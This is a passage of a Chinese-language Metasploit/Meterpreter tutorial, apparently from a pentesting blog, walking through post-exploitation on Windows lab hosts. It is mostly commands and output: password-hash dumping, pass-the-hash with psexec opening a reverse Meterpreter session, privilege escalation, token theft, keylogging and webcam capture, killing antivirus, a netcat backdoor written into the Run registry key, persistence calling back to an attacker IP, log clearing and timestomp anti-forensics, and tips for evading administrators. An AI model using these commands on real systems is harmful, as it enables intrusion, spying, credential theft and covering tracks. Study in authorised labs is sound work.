+<p>[*] Running module against WIN-2GDMU51OVMC<br>[*] Hashes will be saved to the database if one is connected.<br>[+] Hashes will be saved in loot in JtR password file format to:<br>[*] /home/hdp/.msf4/loot/20201229212615_default_192.168.2.132_windows.hashes_580890.txt<br>[*] Dumping password hashes…<br>[*] Running as SYSTEM extracting hashes from registry<br>[*]     Obtaining the boot key…<br>[*]     Calculating the hboot key using SYSKEY 42dcad03131c165d4e7ed3355f0d4496…<br>[*]     Obtaining the user list and keys…<br>[*]     Decrypting user keys…<br>[*]     Dumping password hints…<br>[*]     No users with password hints on this system<br>[*]     Dumping password hashes…<br>[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>[+]     ppp:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
+<p>脚本和post模块都需要通过“run”命令执行.</p>
+<p><code>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::，所以我们得到了两个用户账号，分别为Administrator和ppp。</code></p>
+<p>其中的<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/LAN_Manager">LM</a>哈希（aad3b435b51404eeaad3b435b51404ee）跟<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM</a>哈希（31d6cfe0d16ae931b73c59d7e0c089c0）对应的是一个空密码。</p>
+<p>解密网站  <a target="_blank" rel="noopener" href="https://www.cmd5.com/">cmd5.com</a></p>
+<p>步骤为:</p>
+<ol>
+<li>检查已有权限+系统类型 </li>
+<li>检查是否为域控制器 </li>
+<li>从注册表读hash，若失败，注入LSASS进程；若域控制器，直接注入LSASS进程 </li>
+<li>若win2008+会话管理员权限，尝试使用getsystem，若在system不能注入LSASS，先migrate到system权限下的进程，继续注入LSASS </li>
+<li>若win7/Vista+UAC关闭+会话管理员权限，尝试getsystem，读取hash </li>
+<li>若win2003/xp/2000，直接getsystem，读取hash </li>
+</ol>
+<h4 id="通过hash获取权限"><a href="#通过hash获取权限" class="headerlink" title="通过hash获取权限"></a>通过hash获取权限</h4><p>msf &gt; use exploit/windows/smb/psexec</p>
+<p>msf exploit(psexec) &gt; show options  </p>
+<p>Module options (exploit/windows/smb/psexec):  </p>
+<p>Name    Current Setting Required Description</p>
+<hr>
+<p>RHOST            yes    The target address</p>
+<p>RPORT   445       yes    Set the SMB service port</p>
+<p>SHAREADMIN$      yes    The share to connect to, can be an admi                        n share</p>
+<p>(ADMIN$,C$,…) or a normal read/write folder share</p>
+<p>SMBDomainWORKGROUP    no    The Windows domain to use for authentication</p>
+<p>SMBPass           no    The password for the specified username</p>
+<p>SMBUser           no    The username to authenticate as  </p>
+<p>Exploit target:  </p>
+<p>Id Name</p>
+<hr>
+<p>0  Automatic  </p>
+<p>msf exploit(psexec) &gt; set RHOST 192.168.2.132</p>
+<p>RHOST =&gt; 192.168.2.132</p>
+<p>msf exploit(psexec) &gt; set SMBUser isosky</p>
+<p>SMBUser =&gt; ppp</p>
+<p>msf exploit(psexec) &gt; set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537  </p>
+<p>SMBPass =&gt; 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537</p>
+<p>msf exploit(psexec) &gt; exploit</p>
+<p>[*] Started reverse handler on 192.168.0.3:4444</p>
+<p>[*] Connecting to the server…</p>
+<p>[*] Authenticating to 192.168.0.254:445|WORKGROUP as user ‘isosky’…</p>
+<p>[*] Uploading payload…</p>
+<p>[*] Created \UGdecsam.exe…</p>
+<p>[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] …</p>
+<p>[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] …</p>
+<p>[*] Obtaining a service manager handle…</p>
+<p>[*] Creating a new service (MZsCnzjn - “MrZdoQwIlbBIYZQJyumxYX”)…</p>
+<p>[*] Closing service handle…</p>
+<p>[*] Opening service…</p>
+<p>[*] Starting the service…</p>
+<p>[*] Removing the service…</p>
+<p>[*] Closing service handle…</p>
+<p>[*] Deleting \UGdecsam.exe…</p>
+<p>[*] Sending stage (749056 bytes) to 192.168.0.254</p>
+<p>[*] Meterpreter session 1 opened (192.168.0.3:4444 -&gt; 192.168.0.254:1877) at 2011-07-19 03:57:17 +0800</p>
+<h4 id="捕捉屏幕"><a href="#捕捉屏幕" class="headerlink" title="捕捉屏幕"></a>捕捉屏幕</h4><p>screenshot</p>
+<h4 id="得到远程桌面"><a href="#得到远程桌面" class="headerlink" title="得到远程桌面"></a>得到远程桌面</h4><p>使用命令“run vnc”将会弹出窗口，在此窗口中就是对方现在打开的桌面情况，在这里，可以对远程机器进行操控。</p>
+<p>(此操作需要windows先下载VNC服务器)</p>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这是meterpreter中实施漏洞利用系统特权要求的一个重要的模块。为了这个目的,我们必须用PRIV extention.，在旧版本的Metasploit中Priv extension并不自动装载，使用“use priv”手动加载的。然而在后来的msf版本中并不需要担心这一点。</p>
+<p>使用“getuid”获得当前的权限，migrate+PID迁移进程（当我们攻击一个系统是，常常是对像是IE之类的服务漏洞进行利用的，可是不免有对方关闭IE的情况，那么我们的meterpreter会话将会关闭，从而导致与目标系统失去连接，所以我们可以使用迁移进程后的攻击模块，将sessions迁移到内存空间中的其他稳定的、不会被关闭的服务进程中，以维持稳定的系统控制），从列表中看到PID为500的是administrator权限，所以是迁移到administrator的权限，“getsystem –h”升级为权限SYSTEM账户。这个模块可以用来提升我们的特权，有四个技巧。Meterpreter自动检查四个方法并且尝试其最好方法。然后看到我们权限又变为了system权限了。</p>
+<ul>
+<li><p>ps#列出正在运行的进程</p>
+</li>
+<li><p>kill [pid] # 杀死进程</p>
+</li>
+<li><p>migrate pid # 将Meterpreter会话移植到进程数为pid的进程中,需要注意的是如果存在杀软的话可能会阻止进程注入，所以把会话进程注入到svchost.exe是一个好方法</p>
+</li>
+<li><p>getprivs#尽可能获取尽可能多的特权</p>
+</li>
+<li><p>getuid #获得当前的权限</p>
+</li>
+<li><p>getsystem #通过各种攻击向量将一个管理帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户</p>
+</li>
+<li><p>getsystem –H #升级权限SYSTEM账户（注意是大写H，小写h为help）</p>
+</li>
+</ul>
+<p>使用MS14-058之类的Exp进行提权:</p>
+<p>meterpreter &gt; background</p>
+<p>[*] Backgrounding session 3..</p>
+<p>msf exploit(handler) &gt; use exploit/windows/local/ms14_058_track_popup_menu</p>
+<p>msf exploit(ms14_058_track_popup_menu) &gt; set SESSION 3</p>
+<p>use priv#加载特权提升扩展模块，来扩展Meterpreter库</p>
+<p> 一般来说：</p>
+<p>列出远程机器的进程和进程ID方便迁移我们的进程，进而改变我们的权限。使用“ps”命令</p>
+<p>在得到的进程列表后，可以实现迁移进程，用getpid查看当前进程号，然后根据上图既可以知道当前的权限，若再用migrate+pid，就会迁移到另一个进程中，然后我们的权限就改变了</p>
+<h2 id="盗取令牌"><a href="#盗取令牌" class="headerlink" title="盗取令牌"></a>盗取令牌</h2><ul>
+<li><p>meterpreter &gt;use incognito  加载incoginto(隐姓埋名)功能（用来盗窃目标主机的令牌或是假冒用户)</p>
+</li>
+<li><p>meterpreter &gt;list_tokens -u  列出目标主机用户的可用令牌</p>
+</li>
+<li><p>meterpreter &gt;list_tokens -g  列出目标主机用户组的可用令牌</p>
+</li>
+<li><p>meterpreter &gt;impersonate_token DOMAIN_NAME\USERNAME  假冒目标主机上的可用令牌,</p>
+<p>​    如meterpreter &gt; impersonate_token QLWEB\Administrato</p>
+</li>
+<li><p>meterpreter &gt;execute -f cmd.exe -i -t #调用域权限shell</p>
+</li>
+<li><p>meterpreter &gt; getuid</p>
+</li>
+<li><p>meterpreter&gt;add_user 0xfa funny –h192.168.2.132 #在域控主机上添加账户</p>
+</li>
+<li><p>meterpreter&gt;reg command  # 在目标主机注册表中进行交互，创建，删除，查询等操作</p>
+</li>
+</ul>
+<ul>
+<li><p>meterpreter&gt;setdesktop number  #切换到另一个用户界面（该功能基于哪些用户已登录）</p>
+</li>
+<li><p>meterpreter&gt;ps #查看目标机器进程，找出域控账户运行的进程ID</p>
+</li>
+<li><p>meterpreter&gt;steal_token pid #盗窃给定进行的可用令牌并进行令牌假冒</p>
+</li>
+<li><p>meterpreter&gt;drop_token pid #停止假冒当前令牌</p>
+</li>
+</ul>
+<h2 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h2><p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令“clearev”命令来清除事件日志</p>
+<p><code>执行“clearev”命令，将清除事件日志。这个命令没有任何选项或参数。</code></p>
+<p>执行“clearev”命令后打开目标机器的事件查看器里面的应用程序、安全性、系统都是是空的：</p>
+<h2 id="网络摄像头"><a href="#网络摄像头" class="headerlink" title="网络摄像头"></a>网络摄像头</h2><ul>
+<li><p>record_mic　　　 #音频录制</p>
+</li>
+<li><p>webcam_chat　　　#查看摄像头接口</p>
+</li>
+<li><p>webcam_list　　　#查看摄像头列表</p>
+</li>
+<li><p>webcam_stream　　#摄像头视频获取</p>
+</li>
+<li><p>webcam_list</p>
+</li>
+</ul>
+<p>meterpreter &gt; webcam_list</p>
+<h2 id="一些脚本命令"><a href="#一些脚本命令" class="headerlink" title="一些脚本命令"></a>一些脚本命令</h2><p>为获取远程机器上的信息，在meterpreter中还有很多脚本可用，做更大的渗透测试。</p>
+<p>使用“run scriptname”来使用meterpreter模块中的脚本命令</p>
+<p>调用post/windows/gather/checkvm后渗透模块，</p>
+<p>(1)确定目标主机是否是一台虚拟机：</p>
+<p>run post/windows/gather/checkvm</p>
+<p>(2) 查看目标系统的所有网络流量，并且进行数据包记录，-i 1指定记录数据包的网卡。</p>
+<p>packetrecorder——“run packetrecorder”</p>
+<p>(3) get_local_subnets——“run get_local_subnets”得到本地子网网段</p>
+<p>(4) getcountermeasure—run getcountermeasure显示HIPS和AV进程的列表，显示远程机器的防火墙规则，列出DEP和UAC策略</p>
+<p>(5) scraper——“run scraper”从目标主机获得所有网络共享等信息</p>
+<p>并且获得的这些所有这些信息都存储在/root/.msf4/logs/scripts/scraper directory目录下。使用ls命令查看存储的这些文件</p>
+<p>(6) killav——“run killav”命令终止Av进程，可以很快的清除我们的路径和有效渗透测试的记录</p>
+<p>但是这个脚本,不能绝对得逃避杀毒软件，但是如果成功了对被攻击者会是一个严重的打击，对他造成很大的困扰</p>
+<p>(7)hashdump——“run hashdump”获得密码哈希值</p>
+<p>运行这个脚本和在meterpreter下直接运行hashdump结果差不多。</p>
+<p>(8)keylogrecorder——“run keylogrecorder”命令为记录键盘信息</p>
+<p>运行这个脚本和在meterpreter下直接运行keyscan结果差不多，这里将对键盘记录的文件进行保存，路径如下。</p>
+<p>(9 ) persistence——“run persistence”这个脚本可以被用作持续欺骗主机  </p>
+<p>远程主机重启后将在特定的时间间隔保持meterpreter会话</p>
+<p>run persistence -X -i 5 -p 4444 -r 172.17.11.18  #植入后门</p>
+<p>(10) enum_drives</p>
+<p>这个后渗透攻击模块是获取目标主机磁盘分区信息，我们就以这个例讲解后渗透攻击模块使用方法。</p>
+<p>后渗透模块post/windows/gather/forensics/enum_drives调用</p>
+<p>在获取meterpreter会话session后，调用post/windows/gather/forensics/enum_drives，可获取目标主机存储器信息：</p>
+<p>命令，在msfconsole下：</p>
+<p>use post/windows/gather/forensics/enum_drives</p>
+<p>set SESSION 1</p>
+<p>exploit</p>
+<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>我们还可以使用“execute”命令在目标系统中执行应用程序。这个命令的使用方法如下：</p>
+<ul>
+<li><p>execute -f<file> [Options]</p>
+</li>
+<li><p>execute -f cmd.exe -i#执行cmd.exe命令并进行交互</p>
+</li>
+<li><p>execute -f cmd.exe -i -t#以所有可用令牌来执行cmd命令</p>
+</li>
+<li><p>execute -f cmd.exe -i -H -t#创建新进程cmd.exe，-H不可见，-i交互</p>
+</li>
+<li><p>execute -H -i -f cmd.exe</p>
+</li>
+<li><p>execute -H -m -d notepad.exe-f wce.exe -a “-o wce.txt”</p>
+</li>
+<li><p>运行后它将执行file参数所指定的文件。可选参数如下：</p>
+</li>
+</ul>
+<p>-H：创建一个隐藏进程</p>
+<p>-a：传递给命令的参数</p>
+<p>-i：跟进程进行交互</p>
+<p>-m：从内存中执行</p>
+<p>-t：使用当前伪造的线程令牌运行进程</p>
+<p>-s：在给定会话中执行进程</p>
+<p>-f 执行的程序文件</p>
+<p>-d 在目标主机执行时显示的进程名称（用以伪装）</p>
+<p>-o wce.txt”是wce.exe的运行参数</p>
+<p><img src="https://images2018.cnblogs.com/blog/1049983/201808/1049983-20180816025536100-225251154.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统"></p>
+<h2 id="创建账号"><a href="#创建账号" class="headerlink" title="创建账号"></a>创建账号</h2><p>getgui——getgui ，为添加用户的命令，首先用“run getgui -h”查看脚本getgui的帮助信息</p>
+<ul>
+<li><p>run getgui-e #开启远程桌面</p>
+</li>
+<li><p>run getgui -uexample_username  -pexample_password #添加账号</p>
+</li>
+</ul>
+<p>调用getgui后渗透攻击模块</p>
+<p>作用：开启目标主机远程桌面，并可添加管理员组账号</p>
+<p>命令：</p>
+<p>run getgui -e</p>
+<p>开启目标主机远程桌面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152725.png"></p>
+<p>当时见到这里报错，于是又试了好几个，但是当回去看靶机的时候，的确已经被添加进去了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152741.png"></p>
+<p>具体原因的话，暂时还不太清楚</p>
+<p>执行成功后，可以使用kali的rdesktop命令使用远程桌面连接目标主机</p>
+<p>rdesktop -u 111 -p 111 192.168.2.132:3389</p>
+<p>发现可以成功发登录</p>
+<h2 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h2><p>当我们新添加的用户已经拥有<a target="_blank" rel="noopener" href="https://www.coengoedegebure.com/hacking-windows-with-meterpreter/#anchor_createanewaccount">远程桌面权限</a>之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
+<p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的getgui脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152756.png"></p>
+<p>在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长,这样可以降低你被发现的概率</p>
+<blockquote>
+<p>meterpreter &gt; idletime<br>User has been idle for: 59 mins 44 secs</p>
+</blockquote>
+<h2 id="绑定进程"><a href="#绑定进程" class="headerlink" title="绑定进程"></a>绑定进程</h2><p>Meterpreter既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p>
+<p>在下面的例子中，我们会将Meterpreter跟winlogon.exe绑定，并在登录进程中捕获键盘记录。</p>
+<p>首先，我们需要使用“ps”命令查看目标设备中运行的进程：</p>
+<p>接下来，使用“getpid”找出需要绑定的进程，接下来，使用<code>migrate命令+pid来绑定进程。</code></p>
+<p>绑定完成之后，我们就可以开始捕获键盘数据了</p>
+<p><code>keyscan_start</code></p>
+<p>接下来，我们可以选择导出键盘记录，或者使用命令“enum_logged_on_users”来检查用户是否成功登录：</p>
+<p><code>run post/windows/gather/enum_logged_on_users</code></p>
+<p>等待片刻之后，使用keyscan_dump命令导出记录信息:</p>
+<p><code>keyscan_dump</code></p>
+<h2 id="通过其-shell-来关闭防火墙"><a href="#通过其-shell-来关闭防火墙" class="headerlink" title="通过其 shell 来关闭防火墙"></a>通过其 shell 来关闭防火墙</h2><p><code>netsh adcfirewall set allprofiles state off</code></p>
+<p><img src="https://images2018.cnblogs.com/blog/1049983/201808/1049983-20180816025545548-149606623.gif" alt="20161006113355"></p>
+<p>防火墙已被关闭</p>
+<p>但是我们可以看出，如果目标管理员查看防火墙配置，发现防火墙被人为关闭，那么必定引起管理员的警惕！因此，我们还可以通过策略的添加，来隐蔽我们的行为。</p>
+<p><code>netsh firewall add portopening TCP 444 “VMWARE” ENABLE ALL</code></p>
+<p>伪装成一个系统正常的进程，之后远程重启目标系统，并利用 NC 连接即可！</p>
+<h2 id="利用注册表添加-NC-后门"><a href="#利用注册表添加-NC-后门" class="headerlink" title="利用注册表添加 NC 后门"></a>利用注册表添加 NC 后门</h2><p>1.上传 NC 到目标系统：</p>
+<p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p>
+<p>2.枚举注册表内容（开机启动）</p>
+<p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p>
+<p>3.在该注册表增加内容（开机启动）</p>
+<p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d “C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe”</p>
+<p>4.查看内容是否增加成功：</p>
+<p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p>
+<h2 id="基于MACE时间的反电子取证"><a href="#基于MACE时间的反电子取证" class="headerlink" title="基于MACE时间的反电子取证"></a>基于MACE时间的反电子取证</h2><p>timestomp -v secist.txt #查看当前目标文件 MACE 时间</p>
+<p>timestomp c:/a.doc -c “10/27/2015 14:22:11” #修改文件的创建时间，例如修改文件的创建时间（反取证调查）</p>
+<p>timestomp -f c:\AVScanner.ini secist.txt （将模板文件MACE时间，复制给当前文件）</p>
+<p>timestomp -v secist.txt</p>
+<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>meterpreter &gt; run autoroute -s 192.168.1.0/24</p>
+<p>msf exploit(handler) &gt; use auxiliary/scanner/portscan/tcp</p>
+<p>msf auxiliary(tcp) &gt; set PORTS 80,8080,21,22,3389,445,1433,3306</p>
+<p>msf auxiliary(tcp) &gt; set RHOSTS 192.168.3.1/24</p>
+<p>msf auxiliary(tcp) &gt; set THERADS 10</p>
+<p>msf auxiliary(tcp) &gt; exploit</p>
+<p>meterpreter &gt; background</p>
+<p>msf exploit(handler) &gt; use auxiliary/server/socks4a</p>
+<p>msf auxiliary(socks4a) &gt; route print</p>
+<p>msf auxiliary(socks4a) &gt; ifconfig</p>
+<p>msf auxiliary(socks4a) &gt; set SRVHOST xxx.xxx.xx.xx #xxx.xxx.xx.xx为自己运行msf的vps机子’</p>
+<p>msf auxiliary(socks4a) &gt; exploit</p>
+<h2 id="SSH代理"><a href="#SSH代理" class="headerlink" title="SSH代理"></a>SSH代理</h2><p>msf &gt; load meta_ssh</p>
+<p>msf &gt; use multi/ssh/login_password</p>
+<p>msf &gt; set RHOST 192.168.56.3</p>
+<p>RHOST =&gt; 192.168.56.3</p>
+<p>msf &gt; set USER test</p>
+<p>USER =&gt; test</p>
+<p>msf &gt; set PASS reverse</p>
+<p>PASS =&gt; reverse</p>
+<p>msf &gt; set PAYLOAD ssh/metassh_session</p>
+<p>PAYLOAD =&gt; ssh/metassh_session</p>
+<p>msf &gt; exploit -z</p>
+<p>[*] Connecting to <a href="mailto:&#100;&#115;&#x6c;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#53;&#54;&#x2e;&#x33;">&#100;&#115;&#x6c;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#53;&#54;&#x2e;&#x33;</a>:22 with password reverse</p>
+<p>[*] metaSSH session 1 opened (127.0.0.1 -&gt; 192.168.56.3:22) at 2011-12-28  03:51:16 +1300</p>
+<p>[*] Session 1 created in the background.</p>
+<p>msf &gt; route add 192.168.57.0 255.255.255.0 1</p>
+<p>之后就是愉快的内网扫描了</p>
+<p>当然还是推荐直接用</p>
+<p>ssh -f -N -D 127.0.0.1:6666 <a href="mailto:&#116;&#x65;&#115;&#x74;&#x40;&#49;&#x30;&#x33;&#46;&#50;&#50;&#x34;&#46;&#56;&#49;&#x2e;&#x31;&#46;&#x31;">&#116;&#x65;&#115;&#x74;&#x40;&#49;&#x30;&#x33;&#46;&#50;&#50;&#x34;&#46;&#56;&#49;&#x2e;&#x31;&#46;&#x31;</a></p>
+<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><p>meterpreter &gt; run autoroute -s 192.168.3.98</p>
+<p>meterpreter &gt; background</p>
+<p>[*] Backgrounding session 2…</p>
+<p>msf exploit(handler) &gt; use auxiliary/scanner/portscan/tcp</p>
+<p>msf auxiliary(tcp) &gt; set PORTS 80,8080,21,22,3389,445,1433,3306</p>
+<p>PORTS =&gt; 80,8080,21,22,3389,445,1433,3306</p>
+<p>msf auxiliary(tcp) &gt; set RHOSTS 192.168.3.1/24</p>
+<p>RHOSTS =&gt; 192.168.3.1/24</p>
+<p>msf auxiliary(tcp) &gt; set THERADS 10</p>
+<p>THERADS =&gt; 10</p>
+<p>msf auxiliary(tcp) &gt; exploit</p>
+<h1 id="常用破解模块和脚本"><a href="#常用破解模块和脚本" class="headerlink" title="常用破解模块和脚本"></a>常用破解模块和脚本</h1><h2 id="好用的模块"><a href="#好用的模块" class="headerlink" title="好用的模块"></a>好用的模块</h2><p>auxiliary/admin/realvnc_41_bypass (Bypass VNCV4网上也有利用工具)</p>
+<p>auxiliary/admin/cisco/cisco_secure_acs_bypass （cisco Bypass 版本5.1或者未打补丁5.2版洞略老）</p>
+<p>auxiliary/admin/http/jboss_deploymentfilerepository （内网遇到Jboss最爱:)）</p>
+<p>auxiliary/admin/http/dlink_dir_300_600_exec_noauth (Dlink 命令执行:)</p>
+<p>auxiliary/admin/mssql/mssql_exec （用爆破得到的sa弱口令进行执行命令没回显:(）</p>
+<p>auxiliary/scanner/http/jboss_vulnscan (Jboss 内网渗透的好朋友)</p>
+<p>auxiliary/admin/mysql/mysql_sql (用爆破得到的弱口令执行sql语句:)</p>
+<p>auxiliary/admin/oracle/post_exploitation/win32exec （爆破得到Oracle弱口令来Win32命令执行）</p>
+<p>auxiliary/admin/postgres/postgres_sql (爆破得到的postgres用户来执行sql语句)</p>
+<p>auxiliary/scanner/rsync/modules_list （Rsync）</p>
+<p>auxiliary/scanner/misc/redis_server (Redis)</p>
+<p>auxiliary/scanner/ssl/openssl_heartbleed (心脏滴血)</p>
+<p>auxiliary/scanner/mongodb/mongodb_login (Mongodb)</p>
+<p>auxiliary/scanner/elasticsearch/indices_enum (elasticsearch)</p>
+<p>auxiliary/scanner/http/axis_local_file_include (axis本地文件包含)</p>
+<p>auxiliary/scanner/http/http_put (http Put)</p>
+<p>auxiliary/scanner/http/gitlab_user_enum (获取内网gitlab用户)</p>
+<p>auxiliary/scanner/http/jenkins_enum (获取内网jenkins用户)</p>
+<p>auxiliary/scanner/http/svn_scanner （svn Hunter :)）</p>
+<p>auxiliary/scanner/http/tomcat_mgr_login (Tomcat 爆破)</p>
+<p>auxiliary/scanner/http/zabbix_login （Zabbix :)）</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在获得meterpreter的session后，除了meterpreter本身内置的一些基本功能，在/usr/share/metasploit-framework/scripts/meterpreter下面还有很多scripts，提供了很多额外功能，非常好用</p>
+<p>我们可以通过run 脚本名来进行使用</p>
+<p>run 脚本名 -h可以查看帮助</p>
+<ul>
+<li><p>1.arp_scanner</p>
+<p>利用arp进行存活主机扫描</p>
+<p>run arp_scanner-r 192.168.1.0/</p>
+</li>
+<li><p>2.autoroute</p>
+<p>可以添加，删除，显示路由表</p>
+</li>
+<li><p>3.checkvm</p>
+<p>可以检测目标是否是虚拟机</p>
+</li>
+<li><p>4.credcollect</p>
+<p>收集目标主机上的hash等凭证</p>
+</li>
+<li><p>5.domain_list_gen</p>
+<p>获取域管理账户列表，并判断当前session所在用户是否在列表中</p>
+</li>
+<li><p>6.dumplinks</p>
+<p>Link文件包含时间戳，文件位置，共享名，卷序列号，等。脚本会在用户目录和office目录中收集lnk文件</p>
+<p>调用post/windows/gather/dumplinks获取目标主机上最近访问过的文档、链接信息</p>
+<p>命令：run post/windows/gather/dumplinks</p>
+</li>
+<li><p>7.duplicate</p>
+<p>再次产生payload，注入到其他进程或打开新进程并注入其中</p>
+</li>
+<li><p>8.enum_chrome</p>
+<p>获取chrome中的信息</p>
+</li>
+<li><p>9.enum_firefox</p>
+<p>获取firefox中的信息，包括cooikie，历史纪录，书签</p>
+</li>
+<li><p>10 enum_logged_on_users </p>
+<p>​    列出当前登录的用户</p>
+</li>
+<li><p>11 enum_powershell_env</p>
+<p>列出powershell和WSH的配置文件</p>
+</li>
+<li><p>12 enum_putty</p>
+<p>列出putty的配置文件 (putty 远程代理)</p>
+</li>
+<li><p>13.enum_shares</p>
+<p>列出共享及历史共享</p>
+</li>
+<li><p>enum_vmware</p>
+<p>列出vmware的配置文件和产品</p>
+</li>
+<li><p>event_manager</p>
+<p>可以查询和清理事件日志</p>
+</li>
+<li><p>16.file_collector</p>
+<p>搜索符合指定模式的文件</p>
+</li>
+<li><p>17.get_application_list</p>
+<p>获取安装的程序列表及版本</p>
+</li>
+<li><p>18.getcountermeasure</p>
+<p>列出HIPS  (主机入侵预防系统)  和 AV (av.exe是W32/Alphx.worm<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92">蠕虫病毒</a>的一部分。这个病毒会更改你的Internet Explorer首页。这个进程的安全等级是建议立即进行删除。)的进程，显示XP 防火墙规则, 并且显示 DEP和UAC 策略</p>
+<p>Ps：-k参数可以杀掉防护软件进程</p>
+<blockquote>
+<p>dep: 数据执行保护</p>
+<p>应用会留出一部分电脑内存用于暂存数据，同时留出另一部分<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%86%85%E5%AD%98/103614">内存</a>用于暂存应用使用的指令。 黑客可能试图诱使应用运行（也称为执行）放置在电脑内存中伪装成指令的有害数据。 这可能会让黑客得以控制你的电脑。</p>
+<p>DEP 可以防止应用运行用于暂存指令的那部分内存中的数据，从而保护电脑。 如果 DEP 发现某个运行此类数据的应用，它将关闭该应用并通知你。</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>uac:用户账户控制</p>
+<p><strong>用户帐户控制</strong>（<em>User Account Control</em>，简写作UAC)是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A1%AC%E7%9B%98%E9%A9%B1%E5%8A%A8%E5%99%A8/213766">硬盘驱动器</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6/7581367">系统文件</a>授权，以达到帮助阻止<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/411166">恶意程序</a>（有时也称为“<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/6588650">恶意软件</a>”）损坏系统的效果。</p>
+</blockquote>
+<ul>
+<li><p>19.get_env</p>
+<p>获取所有用户的环境变量</p>
+</li>
+<li><p>20.get_filezilla_creds</p>
+<p>获取filezilla的登陆凭证</p>
+</li>
+<li><p>21.getgui</p>
+<p>可以很方便的开启远程桌面服务，添加用户，端口转发功能</p>
+</li>
+<li><p>22.get_local_subnets</p>
+<p>获得本地的子网</p>
+</li>
+<li><p>23.get_pidgin_creds</p>
+<p>获取pidgin配置文件中的用户名和密码</p>
+</li>
+<li><p>24.gettelnet</p>
+<p>同之前开启终端桌面服务的脚本，这个是用来开启telnet的</p>
+</li>
+<li><p>25.get_valid_community</p>
+<p>获取SNMP community字符串</p>
+</li>
+<li><p>26.getvncpw</p>
+<p>获取vnc密码</p>
+</li>
+<li><p>27.hashdump</p>
+<p>同meterpreter的内置功能</p>
+</li>
+<li><p>28.hostsedit</p>
+<p>操作hosts文件</p>
+</li>
+<li><p>29.keylogrecorder</p>
+<p>Meterpreter内置此功能</p>
+</li>
+<li><p>30.killav</p>
+<p>关闭防护软件</p>
+</li>
+<li><p>31.metsvc</p>
+<p>将payload安装为服务</p>
+</li>
+<li><ol start="32">
+<li>migrate</li>
+</ol>
+<p>将meterpreter会话移植到另一个进程</p>
+<p>例如反弹的meterpreter会话是对方打开了一个你预置特殊代码的word文档而产生的，那么对方一旦关闭掉该word文档，我们获取到的meterpreter会话就会随之关闭，所以把会话进程注入到explorer.exe是一个好方法</p>
+</li>
+<li><p>33 persistence</p>
+<p>可见建立一个持久性的后门，设置成开机启动</p>
+</li>
+<li><p>34.service_permissions_escalate</p>
+<p>许多服务被配置了不安全 的权限。 这个脚本会尝试创建一个服务, 然后会搜索已存在d服务，找到不安全的文件或配置有问题的文件，用一个payload替换掉他，然后会尝试重启服务来运行这个paylaod，如果重启服务失败，则在下次服务器重启时会执行payload</p>
+</li>
+<li><p>35 vnc</p>
+<p>远程桌面服务</p>
+</li>
+<li><p>36 win32-sshserver</p>
+<p>安装openssh服务</p>
+</li>
